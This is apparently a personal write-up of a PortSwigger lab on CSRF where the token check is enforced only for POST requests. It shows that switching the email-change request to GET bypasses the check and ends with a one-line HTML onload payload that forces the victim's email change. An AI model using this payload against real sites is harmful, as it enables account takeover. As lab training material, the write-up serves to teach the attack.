# CSRF — Token Checks Depend on the HTTP Method Used

The email-change feature here does attempt to defend against CSRF, but that defense is only enforced for certain request methods — not all of them.

**Goal:** Host an HTML page on the exploit server that performs a CSRF attack to change the victim's email address.

Login credentials for your own account: wiener:peter

Hint: Registering an email already used by someone else isn't allowed. If you test with your own account, be sure to use a different address when building the exploit you'll actually send to the victim.

---

**Reference:** https://portswigger.net/web-security/csrf

---

Lab URL generated: https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/

pic 1

pic 2

The normal request is a POST:

pic 3

Switching the method to GET still works:

/my-account/change-email?email=test3%40test.com

pic 4

A redirect response is returned — following it confirms the email was actually updated:

pic 5

pic 6

Final payload used:

```
<body onload="window.open('https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/my-account/change-email?email=test3%40test.com')">
```

pic 7
